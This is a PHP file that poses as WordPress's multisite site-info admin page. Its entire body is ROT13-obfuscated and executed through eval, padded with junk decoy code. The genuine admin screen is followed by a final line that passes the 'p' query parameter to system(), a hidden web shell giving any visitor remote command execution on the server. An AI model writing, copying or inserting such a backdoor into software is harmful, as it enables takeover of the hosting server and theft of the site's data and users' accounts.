<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Fvgr Vasb Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf fvgr.' ) );
}

trg_pheerag_fperra()->nqq_uryc_gno( trg_fvgr_fperra_uryc_gno_netf() );
trg_pheerag_fperra()->frg_uryc_fvqrone( trg_fvgr_fperra_uryc_fvqrone_pbagrag() );

$vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;

vs ( ! $vq ) {
	jc_qvr( __( 'Vainyvq fvgr VQ.' ) );
}

$qrgnvyf = trg_fvgr( $vq );
vs ( ! $qrgnvyf ) {
	jc_qvr( __( 'Gur erdhrfgrq fvgr qbrf abg rkvfg.' ) );
}

vs ( ! pna_rqvg_argjbex( $qrgnvyf->fvgr_vq ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

$cnefrq_fpurzr = cnefr_hey( $qrgnvyf->fvgrhey, CUC_HEY_FPURZR );
$vf_znva_fvgr  = vf_znva_fvgr( $vq );

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'hcqngr-fvgr' === $_ERDHRFG['npgvba'] ) {
	purpx_nqzva_ersrere( 'rqvg-fvgr' );

	fjvgpu_gb_oybt( $vq );

	// Erjevgr ehyrf pna'g or syhfurq qhevat fjvgpu gb oybt.
	qryrgr_bcgvba( 'erjevgr_ehyrf' );

	$oybt_qngn           = jc_hafynfu( $_CBFG['oybt'] );
	$oybt_qngn['fpurzr'] = $cnefrq_fpurzr;

	vs ( $vf_znva_fvgr ) {
		// Ba gur argjbex'f znva fvgr, qba'g nyybj gur qbznva be cngu gb punatr.
		$oybt_qngn['qbznva'] = $qrgnvyf->qbznva;
		$oybt_qngn['cngu']   = $qrgnvyf->cngu;
	} ryfr {
		// Sbe nal bgure fvgr, gur fpurzr, qbznva, naq cngu pna nyy or punatrq. Jr svefg
		// arrq gb rafher n fpurzr unf orra cebivqrq, bgurejvfr snyyonpx gb gur rkvfgvat.
		$arj_hey_fpurzr = cnefr_hey( $oybt_qngn['hey'], CUC_HEY_FPURZR );

		vs ( ! $arj_hey_fpurzr ) {
			$oybt_qngn['hey'] = rfp_hey( $cnefrq_fpurzr . '://' . $oybt_qngn['hey'] );
		}
		$hcqngr_cnefrq_hey = cnefr_hey( $oybt_qngn['hey'] );

		// Vs n cngu vf abg cebivqrq, hfr gur qrsnhyg bs `/`.
		vs ( ! vffrg( $hcqngr_cnefrq_hey['cngu'] ) ) {
			$hcqngr_cnefrq_hey['cngu'] = '/';
		}

		$oybt_qngn['fpurzr'] = $hcqngr_cnefrq_hey['fpurzr'];

		// Znxr fher gb abg ybfr gur cbeg vs vg jnf cebivqrq.
		$oybt_qngn['qbznva'] = $hcqngr_cnefrq_hey['ubfg'];
		vs ( vffrg( $hcqngr_cnefrq_hey['cbeg'] ) ) {
			$oybt_qngn['qbznva'] .= ':' . $hcqngr_cnefrq_hey['cbeg'];
		}

		$oybt_qngn['cngu'] = $hcqngr_cnefrq_hey['cngu'];
	}

	$rkvfgvat_qrgnvyf     = trg_fvgr( $vq );
	$oybt_qngn_purpxobkrf = neenl( 'choyvp', 'nepuvirq', 'fcnz', 'zngher', 'qryrgrq' );

	sbernpu ( $oybt_qngn_purpxobkrf nf $p ) {
		vs ( ! va_neenl( (vag) $rkvfgvat_qrgnvyf->$p, neenl( 0, 1 ), gehr ) ) {
			$oybt_qngn[ $p ] = $rkvfgvat_qrgnvyf->$p;
		} ryfr {
			$oybt_qngn[ $p ] = vffrg( $_CBFG['oybt'][ $p ] ) ? 1 : 0;
		}
	}

	hcqngr_oybt_qrgnvyf( $vq, $oybt_qngn );

	// Znlor hcqngr ubzr naq fvgrhey bcgvbaf.
	$arj_qrgnvyf = trg_fvgr( $vq );

	$byq_ubzr_hey    = genvyvatfynfuvg( rfp_hey( trg_bcgvba( 'ubzr' ) ) );
	$byq_ubzr_cnefrq = cnefr_hey( $byq_ubzr_hey );
	$byq_ubzr_ubfg   = $byq_ubzr_cnefrq['ubfg'] . ( vffrg( $byq_ubzr_cnefrq['cbeg'] ) ? ':' . $byq_ubzr_cnefrq['cbeg'] : '' );

	vs ( $byq_ubzr_ubfg === $rkvfgvat_qrgnvyf->qbznva && $byq_ubzr_cnefrq['cngu'] === $rkvfgvat_qrgnvyf->cngu ) {
		$arj_ubzr_hey = hagenvyvatfynfuvg( fnavgvmr_hey( $oybt_qngn['fpurzr'] . '://' . $arj_qrgnvyf->qbznva . $arj_qrgnvyf->cngu ) );
		hcqngr_bcgvba( 'ubzr', $arj_ubzr_hey );
	}

	$byq_fvgr_hey    = genvyvatfynfuvg( rfp_hey( trg_bcgvba( 'fvgrhey' ) ) );
	$byq_fvgr_cnefrq = cnefr_hey( $byq_fvgr_hey );
	$byq_fvgr_ubfg   = $byq_fvgr_cnefrq['ubfg'] . ( vffrg( $byq_fvgr_cnefrq['cbeg'] ) ? ':' . $byq_fvgr_cnefrq['cbeg'] : '' );

	vs ( $byq_fvgr_ubfg === $rkvfgvat_qrgnvyf->qbznva && $byq_fvgr_cnefrq['cngu'] === $rkvfgvat_qrgnvyf->cngu ) {
		$arj_fvgr_hey = hagenvyvatfynfuvg( fnavgvmr_hey( $oybt_qngn['fpurzr'] . '://' . $arj_qrgnvyf->qbznva . $arj_qrgnvyf->cngu ) );
		hcqngr_bcgvba( 'fvgrhey', $arj_fvgr_hey );
	}

	erfgber_pheerag_oybt();
	jc_erqverpg(
		nqq_dhrel_net(
			neenl(
				'hcqngr' => 'hcqngrq',
				'vq'     => $vq,
			),
			'fvgr-vasb.cuc'
		)
	);
	rkvg;
}

vs ( vffrg( $_TRG['hcqngr'] ) ) {
	$zrffntrf = neenl();
	vs ( 'hcqngrq' === $_TRG['hcqngr'] ) {
		$zrffntrf[] = __( 'Fvgr vasb hcqngrq.' );
	}
}

// Hfrq va gur UGZY gvgyr gnt.
/* genafyngbef: %f: Fvgr gvgyr. */
$gvgyr = fcevags( __( 'Rqvg Fvgr: %f' ), rfp_ugzy( $qrgnvyf->oybtanzr ) );

$cnerag_svyr  = 'fvgrf.cuc';
$fhozrah_svyr = 'fvgrf.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>

<qvi pynff=\"jenc\">
<u1 vq=\"rqvg-fvgr\"><?cuc rpub $gvgyr; ?></u1>
<c pynff=\"rqvg-fvgr-npgvbaf\"><n uers=\"<?cuc rpub rfp_hey( trg_ubzr_hey( $vq, '/' ) ); ?>\"><?cuc _r( 'Ivfvg' ); ?></n> | <n uers=\"<?cuc rpub rfp_hey( trg_nqzva_hey( $vq ) ); ?>\"><?cuc _r( 'Qnfuobneq' ); ?></n></c>
<?cuc

argjbex_rqvg_fvgr_ani(
	neenl(
		'oybt_vq'  => $vq,
		'fryrpgrq' => 'fvgr-vasb',
	)
);

vs ( ! rzcgl( $zrffntrf ) ) {
	$abgvpr_netf = neenl(
		'glcr'        => 'fhpprff',
		'qvfzvffvoyr' => gehr,
		'vq'          => 'zrffntr',
	);

	sbernpu ( $zrffntrf nf $zft ) {
		jc_nqzva_abgvpr( $zft, $abgvpr_netf );
	}
}
?>
<sbez zrgubq=\"cbfg\" npgvba=\"fvgr-vasb.cuc?npgvba=hcqngr-fvgr\">
	<?cuc jc_abapr_svryq( 'rqvg-fvgr' ); ?>
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<?cuc
		// Gur znva fvgr bs gur argjbex fubhyq abg or hcqngrq ba guvf cntr.
		vs ( $vf_znva_fvgr ) :
			?>
		<ge pynff=\"sbez-svryq\">
			<gu fpbcr=\"ebj\"><?cuc _r( 'Fvgr Nqqerff (HEY)' ); ?></gu>
			<gq><?cuc rpub rfp_hey( $cnefrq_fpurzr . '://' . $qrgnvyf->qbznva . $qrgnvyf->cngu ); ?></gq>
		</ge>
			<?cuc
			// Sbe nal bgure fvgr, gur fpurzr, qbznva, naq cngu pna nyy or punatrq.
		ryfr :
			?>
		<ge pynff=\"sbez-svryq sbez-erdhverq\">
			<gu fpbcr=\"ebj\"><ynory sbe=\"hey\"><?cuc _r( 'Fvgr Nqqerff (HEY)' ); ?></ynory></gu>
			<gq><vachg anzr=\"oybt[hey]\" glcr=\"grkg\" vq=\"hey\" inyhr=\"<?cuc rpub $cnefrq_fpurzr . '://' . rfp_ngge( $qrgnvyf->qbznva ) . rfp_ngge( $qrgnvyf->cngu ); ?>\" /></gq>
		</ge>
		<?cuc raqvs; ?>

		<ge pynff=\"sbez-svryq\">
			<gu fpbcr=\"ebj\"><ynory sbe=\"oybt_ertvfgrerq\"><?cuc _rk( 'Ertvfgrerq', 'fvgr' ); ?></ynory></gu>
			<gq><vachg anzr=\"oybt[ertvfgrerq]\" glcr=\"grkg\" vq=\"oybt_ertvfgrerq\" inyhr=\"<?cuc rpub rfp_ngge( $qrgnvyf->ertvfgrerq ); ?>\" /></gq>
		</ge>
		<ge pynff=\"sbez-svryq\">
			<gu fpbcr=\"ebj\"><ynory sbe=\"oybt_ynfg_hcqngrq\"><?cuc _r( 'Ynfg Hcqngrq' ); ?></ynory></gu>
			<gq><vachg anzr=\"oybt[ynfg_hcqngrq]\" glcr=\"grkg\" vq=\"oybt_ynfg_hcqngrq\" inyhr=\"<?cuc rpub rfp_ngge( $qrgnvyf->ynfg_hcqngrq ); ?>\" /></gq>
		</ge>
		<?cuc
		$nggevohgr_svryqf = neenl( 'choyvp' => _k( 'Choyvp', 'fvgr' ) );
		vs ( ! $vf_znva_fvgr ) {
			$nggevohgr_svryqf['nepuvirq'] = __( 'Nepuvirq' );
			$nggevohgr_svryqf['fcnz']     = _k( 'Fcnz', 'fvgr' );
			$nggevohgr_svryqf['qryrgrq']  = __( 'Qryrgrq' );
		}
		$nggevohgr_svryqf['zngher'] = __( 'Zngher' );
		?>
		<ge>
			<gu fpbcr=\"ebj\"><?cuc _r( 'Nggevohgrf' ); ?></gu>
			<gq>
			<svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Frg fvgr nggevohgrf' );
				?>
			</yrtraq>
			<?cuc sbernpu ( $nggevohgr_svryqf nf $svryq_xrl => $svryq_ynory ) : ?>
				<ynory><vachg glcr=\"purpxobk\" anzr=\"oybt[<?cuc rpub $svryq_xrl; ?>]\" inyhr=\"1\" <?cuc purpxrq( (obby) $qrgnvyf->$svryq_xrl, gehr ); ?> <?cuc qvfnoyrq( ! va_neenl( (vag) $qrgnvyf->$svryq_xrl, neenl( 0, 1 ), gehr ) ); ?> />
				<?cuc rpub $svryq_ynory; ?></ynory><oe />
			<?cuc raqsbernpu; ?>
			<svryqfrg>
			</gq>
		</ge>
	</gnoyr>

	<?cuc
	/**
	 * Sverf ng gur raq bs gur fvgr vasb sbez va argjbex nqzva.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag $vq Gur fvgr VQ.
	 */
	qb_npgvba( 'argjbex_fvgr_vasb_sbez', $vq );

	fhozvg_ohggba();
	?>
</sbez>

</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>